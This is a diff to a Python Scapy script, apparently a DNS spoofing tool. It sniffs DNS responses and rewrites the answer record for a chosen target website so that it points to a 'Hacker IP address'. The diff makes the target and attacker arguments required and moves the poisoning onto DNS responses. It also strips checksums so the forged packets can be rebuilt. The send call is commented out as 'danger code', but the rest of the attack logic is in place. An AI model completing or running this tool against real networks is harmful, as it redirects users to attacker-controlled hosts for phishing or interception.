@@ -8,15 +8,14 @@ import sys, time, datetime
 from datetime import datetime
 import argparse
 
-
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-w", "--website", dest="website",
-                        help="Target Website")
+                        help="Target Website", required=True)
     parser.add_argument("-i", "--ip-address", dest="ip",
-                        help="Hacker IP address")
+                        help="Hacker IP address", required=True)
     parser.add_argument("-I", "--Interface", dest="Interface",
-                        help="Network Interface")
+                        help="Network Interface", required=True)
     opt = parser.parse_args()
     return opt
 
@@ -26,34 +25,26 @@ def sniffer(pkt):
     try:
         if DNSQR in pkt and pkt.dport == 53:
             print('[**] Detected DNS QR Message at: ' + pkt_time)
-            poisoner(pkt)
             # pkt[IP].src = "192.168.1.1"
             # print(pkt.show())
-
         elif DNSRR in pkt and pkt.sport == 53:
             print('[**] Detected DNS RR Message at: ' + pkt_time)
+            poisoner(pkt)
             # print(pkt[DNS].an.show())
-
     except:
         pass
 
 def poisoner(pkt):
-    #### poison = IP(src=src , dst=dst , ttl=128 )/UDP(dport=53)/DNS(rd=1 , qd=DNSQR(qname=qname ,qtype=qtype))
     qname = pkt[DNSQR].qname.decode()
-    opt = get_arguments()
-    # dns_id = pkt.id
-    
     if DNSRR in pkt:
         if opt.website in qname:
-            dns_responce = DNSRR(rrname=qname, rdata=opt.ip)
+            # print(pkt.show()) #original packet
+            dns_responce = DNSRR(rrname=qname, rdata=opt.ip) # generate a new fake RR
             pkt[DNS].an = dns_responce
             pkt[DNS].ancount = 1
-
-            del pkt[IP].len
-            del pkt[IP].chksum
-            del pkt[UDP].len
-            del pkt[UDP].chksum
-            print(pkt.show())
+            del pkt[IP].len, pkt[IP].chksum, pkt[UDP].len, pkt[UDP].chksum
+            # print(pkt.show()) #spoof packet
+            # send(pkt, iface=opt.Interface)  ##danger code
 
 if __name__ == "__main__":
     try:
